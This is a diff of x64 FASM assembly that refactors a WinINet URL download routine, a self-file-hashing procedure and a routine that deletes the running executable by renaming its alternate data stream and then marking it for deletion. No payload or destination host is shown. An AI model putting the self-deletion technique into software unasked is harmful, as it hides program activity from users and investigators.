@@ -1,31 +1,24 @@
-proc open_internet uses rbx rsi rdi r12 r13 r14 r15, lpbuffer, url
-
-locals 
-    bytesread  dq ?
-endl
-
-    mov        r12, rcx ; lpbuffer
-    mov        rdi, rdx
+proc open_internet uses rbx rsi rdi r12, bytesread
 
 frame
     invoke     InternetOpen, szClass, INTERNET_OPEN_TYPE_DIRECT, 0,0,0 
     test       rax, rax
     je         @f
-    mov        rbx, rax
+    mov        rdi, rax
    
-    invoke     InternetOpenUrl, rbx, rdi, 0,0,0,0
+    invoke     InternetOpenUrl, rdi, rsi, 0,0,0,0
     test       rax,rax
     je         @f
-    mov        rsi, rax
+    mov        r12, rax
 
-    invoke     InternetReadFile, rsi, r12, 15000, addr bytesread   
+    invoke     InternetReadFile, r12, rbx, 15000, addr bytesread   
 
 @@: 
-    invoke     InternetCloseHandle, rbx
+    invoke     InternetCloseHandle, rdi
     test       rax, rax
     je         .exit
 
-    invoke     InternetCloseHandle, rsi
+    invoke     InternetCloseHandle, r12
 
 .exit:  
     mov        rax,[bytesread]
@@ -96,7 +89,7 @@ proc SSE_json_parser uses rbx rsi rdi r12 r13 r14 r15, input_key, input_lpbuffer
     jmp        @b
 endp
 
-proc get_self_filehash uses rbx rsi rdi r12 r13 r14 r15, gethash
+proc get_self_filehash uses rbx rsi rdi r12 r13 r14 r15
 
 locals 
     phAlgorithm         dq ?
@@ -170,13 +163,13 @@ endp
 proc self_delete_prog uses rbx rsi rdi r12
 
 locals
-    fri  FILE_RENAME_INFO TRUE, NULL, temp_stream_name.sizeof 
+    fri  FILE_RENAME_INFO TRUE, NULL, ads.sizeof 
     fdi  FILE_DISPOSITION_INFO TRUE
     
     lpbuffer rb MAX_PATH+1
 endl
 
-    lea        rsi,[temp_stream_name]
+    lea        rsi,[ads]
     lea        rdi,[fri.FileName]
     mov        ecx,[fri.FileNameLength]  
     rep        movsw
